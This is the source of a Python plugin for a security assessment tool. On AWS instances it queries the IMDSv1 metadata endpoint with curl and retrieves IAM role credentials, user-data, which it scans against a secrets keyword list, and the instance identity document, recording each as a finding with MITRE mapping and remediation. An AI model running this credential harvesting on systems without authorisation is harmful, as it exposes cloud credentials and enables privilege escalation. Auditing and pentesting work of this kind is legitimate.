"""
plugins/cloud/aws_imds_harvest.py

Cloud Plugin: AWS IMDSv1 Credential Harvesting.

When AWS IMDSv1 is accessible (no token required), this plugin retrieves:
  - The IAM role name attached to the instance
  - Temporary credentials (AccessKeyId, SecretAccessKey, Token)
  - EC2 instance identity document (account ID, region, AMI, instance type)
  - Any user-data that may contain bootstrap secrets

All operations are read-only. No credentials are transmitted externally —
they are logged to the technical report only.

This plugin activates automatically when:
  - ContextEngine detects AWS environment (IMDSv1 accessible)
  - OR --cloud aws is passed explicitly

MITRE ATT&CK: T1552.005 — Unsecured Credentials: Cloud Instance Metadata API
"""

from __future__ import annotations

import json

from pip.core.plugin import CloudPlugin
from pip.models.context import SystemContext, UserContext
from pip.models.finding import Finding, FindingCategory, Severity
from pip.core.shell_compat import ShellCompat

_IMDS_BASE = "http://169.254.169.254/latest"


class AWSIMDSHarvestPlugin(CloudPlugin):
    """Harvest IAM credentials and instance metadata from AWS IMDSv1."""

    name        = "aws_imds_harvest"
    description = "Retrieves AWS IAM role credentials via IMDSv1 (no-auth endpoint)."
    provider    = "aws"

    async def run(
        self,
        sys_ctx: SystemContext,
        user_ctx: UserContext,
        shell: ShellCompat,
    ) -> list[Finding]:
        findings: list[Finding] = []

        # ── Check IMDSv1 is accessible ─────────────────────────────────────────
        probe = shell.run(
            f"curl -s --max-time 2 {_IMDS_BASE}/meta-data/ 2>/dev/null",
            timeout=5,
        )
        if not probe.ok or not probe.output:
            return []

        # ── Retrieve IAM role name ─────────────────────────────────────────────
        role_result = shell.run(
            f"curl -s --max-time 2 {_IMDS_BASE}/meta-data/iam/security-credentials/ 2>/dev/null",
            timeout=5,
        )
        role_name = role_result.output.strip()

        if role_name:
            # ── Retrieve temporary credentials for this role ───────────────────
            creds_result = shell.run(
                f"curl -s --max-time 2 "
                f"{_IMDS_BASE}/meta-data/iam/security-credentials/{role_name} 2>/dev/null",
                timeout=5,
            )
            try:
                creds = json.loads(creds_result.output)
                access_key = creds.get("AccessKeyId", "")
                expiry     = creds.get("Expiration", "")
            except (json.JSONDecodeError, AttributeError):
                access_key, expiry = "", ""

            findings.append(Finding(
                title=f"AWS IAM role credentials retrieved via IMDSv1: {role_name}",
                category=FindingCategory.CLOUD,
                severity=Severity.CRITICAL,
                description=(
                    f"IMDSv1 is accessible without token authentication. "
                    f"The IAM role '{role_name}' is attached to this instance. "
                    f"Temporary credentials were retrieved (AccessKeyId: {access_key}, "
                    f"Expiry: {expiry}). These credentials can be used to escalate "
                    f"privileges within the AWS account depending on the role's IAM policies."
                ),
                evidence=(
                    f"Role: {role_name}\n"
                    f"AccessKeyId: {access_key}\n"
                    f"Expiration: {expiry}"
                ),
                command=f"curl {_IMDS_BASE}/meta-data/iam/security-credentials/{role_name}",
                mitre_id="T1552.005",
                mitre_name="Unsecured Credentials: Cloud Instance Metadata API",
                confidence=0.98,
                verified=True,
                remediation=(
                    "aws ec2 modify-instance-metadata-options "
                    "--instance-id <id> --http-tokens required "
                    "--http-endpoint enabled"
                ),
                source_module=self.name,
            ))

        # ── User data — may contain bootstrap secrets ──────────────────────────
        userdata_result = shell.run(
            f"curl -s --max-time 2 {_IMDS_BASE}/user-data 2>/dev/null",
            timeout=5,
        )
        if userdata_result.ok and userdata_result.output:
            ud = userdata_result.output
            # Check for credential patterns in user-data
            sensitive_keywords = ["password", "secret", "token", "apikey", "api_key",
                                   "aws_access", "private_key", "db_pass"]
            hits = [kw for kw in sensitive_keywords if kw.lower() in ud.lower()]
            if hits:
                findings.append(Finding(
                    title="Sensitive keywords in EC2 user-data",
                    category=FindingCategory.CREDENTIAL,
                    severity=Severity.HIGH,
                    description=(
                        f"EC2 instance user-data is accessible via IMDSv1 and contains "
                        f"keywords suggesting embedded secrets: {', '.join(hits)}. "
                        f"Bootstrap scripts often embed credentials that are not rotated."
                    ),
                    evidence=ud[:300] + ("..." if len(ud) > 300 else ""),
                    command=f"curl {_IMDS_BASE}/user-data",
                    mitre_id="T1552.005",
                    confidence=0.75,
                    source_module=self.name,
                ))

        # ── Instance identity — useful for lateral movement within AWS ─────────
        identity_result = shell.run(
            f"curl -s --max-time 2 "
            f"{_IMDS_BASE}/dynamic/instance-identity/document 2>/dev/null",
            timeout=5,
        )
        if identity_result.ok and identity_result.output:
            try:
                identity = json.loads(identity_result.output)
                findings.append(Finding(
                    title="AWS instance identity document retrieved",
                    category=FindingCategory.CLOUD,
                    severity=Severity.INFO,
                    description=(
                        f"Account ID: {identity.get('accountId', '?')} | "
                        f"Region: {identity.get('region', '?')} | "
                        f"Instance type: {identity.get('instanceType', '?')} | "
                        f"AMI: {identity.get('imageId', '?')}"
                    ),
                    evidence=identity_result.output[:400],
                    command=f"curl {_IMDS_BASE}/dynamic/instance-identity/document",
                    source_module=self.name,
                ))
            except (json.JSONDecodeError, AttributeError):
                pass

        return findings
